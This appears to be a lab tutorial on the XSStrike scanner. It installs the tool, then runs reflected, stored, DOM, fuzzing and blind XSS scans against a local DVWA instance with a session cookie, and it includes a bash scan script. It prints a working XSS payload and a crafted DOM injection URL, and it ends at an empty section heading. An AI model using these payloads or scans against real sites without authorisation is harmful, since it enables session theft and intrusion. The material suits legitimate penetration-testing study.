# XSStrike


## What is XSStrike?
XSStrike is a sophisticated Cross-Site Scripting detection suite equipped with:
  - Multiple parsing engines
  - Handcrafted payloads
  - WAF bypass capabilities
  - Intelligent payload generation
  - Context-aware analysis



# XSStrike Methodology

## 1. Installation

### GitHub Clone (Recommended)
 Clone the repository
````
git clone https://github.com/s0md3v/XSStrike.git
````
<img width="661" height="182" alt="image" src="https://github.com/user-attachments/assets/6993b80e-8c3d-42bf-be4f-71b19045d7a7" />


- Navigate to directory
````
cd XSStrike
ls
````
<img width="909" height="167" alt="image" src="https://github.com/user-attachments/assets/b01c9834-5e4e-4092-8476-e4e6a5da0012" />


- Create environment:
````
python3 -m ven venv
source venv/bin/activate
````
<img width="456" height="192" alt="image" src="https://github.com/user-attachments/assets/124d8519-729a-47d6-8ed4-e5cba6c3692c" />


- Installation dependency
````
pip3 install -r requirements.txt
````
<img width="1029" height="447" alt="image" src="https://github.com/user-attachments/assets/f14639a0-25a9-4e4a-81b1-4f2406497b3a" />


- Run XSStrike:
````
python3 xsstrike.py --help
````
<img width="973" height="641" alt="image" src="https://github.com/user-attachments/assets/fe0f87d8-4254-483c-88e4-7d343440963a" />

---


## Usage Options:


| **Option**            | **Short / Alias** | **Argument**                                        | **Description**                                         |
| --------------------- | ----------------: | --------------------------------------------------- | ------------------------------------------------------- |
| `-h`, `--help`        |                 - | none                                                | Show help and exit.                                     |
| `-u`, `--url`         |                 - | `TARGET`                                            | Target URL to scan.                                     |
| `--data`              |                 - | `PARAMDATA`                                         | POST data to send (for testing POST endpoints).         |
| `-e`, `--encode`      |                 - | `ENCODE`                                            | Encode payloads (specify encoding).                     |
| `--fuzzer`            |                 - | none                                                | Enable payload fuzzer.                                  |
| `--update`            |                 - | none                                                | Update XSStrike to latest rules/version.                |
| `--timeout`           |                 - | `TIMEOUT`                                           | Request timeout (seconds).                              |
| `--proxy`             |                 - | none / proxy URL expected interactively             | Use proxy/proxies for requests.                         |
| `--crawl`             |                 - | none                                                | Enable crawling to discover URLs/parameters.            |
| `--json`              |                 - | none                                                | Treat POST data as JSON (application/json).             |
| `--path`              |                 - | none                                                | Inject payloads into the URL path (not only params).    |
| `--seeds`             |                 - | `ARGS_SEEDS`                                        | Load crawling seed URLs from a file.                    |
| `-f`, `--file`        |                 - | `ARGS_FILE`                                         | Load payloads from a file.                              |
| `-l`, `--level`       |                 - | `LEVEL`                                             | Crawling depth/level.                                   |
| `--headers`           |                 - | `[ADD_HEADERS]`                                     | Add custom headers to requests.                         |
| `-t`, `--threads`     |                 - | `THREADCOUNT`                                       | Number of concurrent threads.                           |
| `-d`, `--delay`       |                 - | `DELAY`                                             | Delay between requests (seconds).                       |
| `--skip`              |                 - | none                                                | Don’t ask for confirmation to continue (auto-continue). |
| `--skip-dom`          |                 - | none                                                | Skip DOM XSS checking.                                  |
| `--blind`             |                 - | none                                                | Inject blind XSS payloads while crawling.               |
| `--console-log-level` |                 - | `{DEBUG,INFO,RUN,GOOD,WARNING,ERROR,CRITICAL,VULN}` | Set console logging level.                              |
| `--file-log-level`    |                 - | `{DEBUG,INFO,RUN,GOOD,WARNING,ERROR,CRITICAL,VULN}` | Set file logging level.                                 |
| `--log-file`          |                 - | `LOG_FILE`                                          | Filename for writing logs.                              |

---




## 3. VERIFY YOUR COOKIE WORKS
- First we need to check our target cookie, first go to our target:
<img width="1036" height="789" alt="image" src="https://github.com/user-attachments/assets/65e0f166-91d5-4b20-b76e-aa2a14026451" />

- Press `F12`:
<img width="1032" height="423" alt="image" src="https://github.com/user-attachments/assets/ca612d1e-969f-4d16-b28a-af6ff00070e0" />

<img width="1920" height="643" alt="image" src="https://github.com/user-attachments/assets/a9069990-4238-49e8-bbda-cdf372684c65" />

- So in this we found our target cookie: `52f23l16nl2mk6ejrbvb6b1vg7`

### Test Manual Access
````
curl "http://192.168.100.97:8080/vulnerabilities/xss_r/?name=test" --cookie "PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"
````
<img width="1216" height="785" alt="image" src="https://github.com/user-attachments/assets/a71e6470-c005-477b-a2ef-e34d41e50f89" />



### Test Reflection
````
curl -G --data-urlencode "name=REFLECTION_TEST" "http://192.168.100.97:8080/vulnerabilities/xss_r/" --cookie "PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"
````
<img width="1371" height="774" alt="image" src="https://github.com/user-attachments/assets/41878e61-5f62-452b-a89d-3fd089f5ec84" />

---




## 4. BASIC XSStrike SCANS
- So in this i test with `DVWA` : http://192.168.100.97:8080
<img width="892" height="646" alt="image" src="https://github.com/user-attachments/assets/fdf7c52b-4954-4936-b475-a6cf0077f931" />



### Test Reflected XSS
````
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_r/?name=test" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"
````
<img width="1147" height="806" alt="image" src="https://github.com/user-attachments/assets/de353b86-03a5-4e3e-a77f-666349b4f0e0" />

<img width="634" height="762" alt="image" src="https://github.com/user-attachments/assets/f45bc3e2-00a7-4d06-be47-3c74cdb47ae4" />

- In this we found alots `Payload` for xss, if i select oe `payload` and `past` to browser like this:
<img width="1132" height="642" alt="image" src="https://github.com/user-attachments/assets/46048647-e14b-451a-aa7d-ad60fad7cec9" />

- Payload: `<detaIlS/+/oNTOGGLe%0a=%0a[8].find(confirm)%0dx//`:
<img width="889" height="489" alt="image" src="https://github.com/user-attachments/assets/1aaa314d-f753-42bb-889b-a7704f7e4083" />

<img width="1203" height="644" alt="image" src="https://github.com/user-attachments/assets/f8683ff8-c177-41b6-a8ac-026166a15b70" />


- `-u`: Target URL with a suspected XSS parameter (name=test).
- `headers`: Sends custom HTTP headers, here, a session cookie to maintain authenticated access.
- ** Behavior Summary
  - XSStrike will test the name parameter for reflected XSS vulnerabilities.
  - It uses payload fuzzing, context analysis, and browser emulation to detect:
  - Reflected payloads
  - Execution contexts (e.g., HTML, JS, attributes)
  - Filter bypasses and sanitization weaknesses**
- **This command is ideal for:
  - Scanning DVWA’s XSS (Reflected) module
  - Validating low-security XSS exposure**



### Test Stored XSS
````
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_s/" --data "txtName=test&mtxMessage=test&btnSign=Sign+Guestbook" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"
````
<img width="1494" height="781" alt="image" src="https://github.com/user-attachments/assets/15b28d5a-617a-4240-8afb-16db58c75ec5" />

<img width="565" height="775" alt="image" src="https://github.com/user-attachments/assets/62abc7ce-f76c-44b1-9486-bdd9b7976728" />

- So in this we found a lots `Payload` , also it will take along time, so was stop it and after we run this command and open browser and go to our target and go to `XSS (Stored)` we will see this:
<img width="1039" height="834" alt="image" src="https://github.com/user-attachments/assets/ee7672d3-a6d2-435c-a4db-76b4f42c6210" />

<img width="800" height="826" alt="image" src="https://github.com/user-attachments/assets/802377e6-00a7-4e38-a0df-addae50e48de" />


- `--data`: POST data simulating a guestbook submission (`txtName`, `mtxMessage`, `btnSign`).
- **Behavior Summary
  • 	XSStrike sends crafted payloads via POST to test for stored XSS vulnerabilities.
  • 	It analyzes:
  • 	Whether payloads are stored in the backend
  • 	Whether they are reflected back unsanitized
  • 	Execution context (HTML, JS, attributes)**
- **This command is ideal for:
  • 	Detecting stored XSS in form-based inputs
  • 	Validating persistent payload injection**


### Test DOM XSS
````
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"
````
<img width="1241" height="195" alt="image" src="https://github.com/user-attachments/assets/125e9d78-4164-4243-b2dd-b401fe8a1ee6" />

- If i take this and type in browser: http://192.168.100.97:8080/vulnerabilities/xss_d/?default=ion%20value=%27German%27%3EGerman%3C/option%3E%22););%27%3E----%3C/option%3E%22);/option%3E%22);ult=%22)+8);
<img width="1216" height="639" alt="image" src="https://github.com/user-attachments/assets/2c7c93b8-8d72-4d08-9a44-3af441469e8f" />

- **Behavior Summary
- XSStrike will analyze the default parameter for DOM-based XSS vulnerabilities.
- It uses a headless browser engine to:
  - Parse and execute JavaScript
  - Detect unsafe DOM sinks (e.g., innerHTML, document.write)
  - Inject payloads and monitor for execution**
- **This command is ideal for:
  - Scanning DVWA’s DOM XSS module
  - Validating client-side injection points**

---



## 5. COMPREHENSIVE SCAN SCRIPT

### Create Automated Scanner
````
sudo mousepad dvwa_scan.sh
````
````
#!/bin/bash
echo "[*] Starting DVWA XSS Scan with XSStrike"
echo "[*] Target: http://192.168.100.97:8080/"
echo "[*] Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"
echo ""

echo "[1] Testing Reflected XSS..."
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_r/?name=test" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --skip

echo ""
echo "[2] Testing Stored XSS..."
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_s/" --data "txtName=test&mtxMessage=test&btnSign=Sign+Guestbook" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --skip

echo ""
echo "[3] Testing DOM XSS..."
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_d/?default=English" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --skip

echo ""
echo "[4] Crawling entire application..."
python3 xsstrike.py -u "http://192.168.100.97:8080/" --crawl --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low"

echo ""
echo "[*] Scan completed!"
````
````
chmod +x dvwa_scan.sh
````
<img width="574" height="331" alt="image" src="https://github.com/user-attachments/assets/3ab013f4-e7a4-4b03-8323-72a27c688b60" />

- Run Script:
````
./dvwa_scan.sh
````
<img width="470" height="755" alt="image" src="https://github.com/user-attachments/assets/5ebdcf34-9b96-4b7d-9ef5-6f307530eb0a" />

<img width="566" height="783" alt="image" src="https://github.com/user-attachments/assets/5479243c-3723-41a9-a9b0-a53eae940914" />

- This script is very good it will find a lots `Payload`.

---



## 6. ADVANCED SCANNING TECHNIQUES

### Aggressive Fuzzing
````
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_r/?name=test" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --fuzzer --skip -t 20
````
<img width="1847" height="721" alt="image" src="https://github.com/user-attachments/assets/d5372bcb-9750-4030-96ab-109c9caf7633" />


- `--fuzzer`: Activates manual payload fuzzing mode, allowing deeper control over injection attempts.
- `--skip`: Skips payloads that are already known to fail, speeding up the scan.
- `-t 20`: Runs 20 concurrent threads, significantly increasing scan speed.
- **Behavior Summary
  - XSStrike will aggressively fuzz the name parameter using its payload set.
  - It will skip redundant or previously failed payloads, optimizing performance.
  - With -t 20, it will use multi-threading to parallelize requests — ideal for faster scans in lab environments.**
- **This command is ideal for:
  • 	High-speed XSS fuzzing in DVWA’s reflected XSS module
  • 	Validating low-security exposure with optimized payload testing**




### Blind XSS Testing
````
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_r/?name=test" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --blind --skip
````
<img width="1786" height="745" alt="image" src="https://github.com/user-attachments/assets/5f47fdff-d301-4fbc-a472-9fab474b28a8" />

- All of these `Payload` we can use.
- `--blind`: Activates Blind XSS mode, injecting payloads that trigger when viewed by an admin or backend system
- **How Blind XSS Works
  - Payloads are injected into inputs that may be stored or logged.
  - Execution happens later, often in an admin panel or logging system.
  - XSStrike uses payloads that call back to external servers or trigger alerts when rendered.**
- **This command is ideal for:
  - Testing for delayed XSS triggers in DVWA’s reflected XSS module
  - Validating backend exposure or unsafe logging**



### Multiple Parameters Test
````
python3 xsstrike.py -u "http://192.168.100.97:8080/vulnerabilities/xss_r/?id=1&name=test&message=hello" --headers "Cookie: PHPSESSID=52f23l16nl2mk6ejrbvb6b1vg7; security=low" --skip
````
<img width="1908" height="824" alt="image" src="https://github.com/user-attachments/assets/49384434-aa32-4390-97ba-1de8de1d87a9" />

- Behavior Summary
  - XSStrike will test all injectable parameters (id, name, message) for reflected XSS vulnerabilities.
  - It uses context-aware payloads and skips redundant ones to improve performance.
  - Ideal for DVWA’s XSS (Reflected) module at low security level.

- This command is ideal for:
  - Scanning multiple parameters in a single request
  - Validating reflected XSS exposure across different input vectors
  - Building a multi-vector XSS workflow for your GitHub portfolio



## 7. DIFFERENT SECURITY LEVELS

### 









































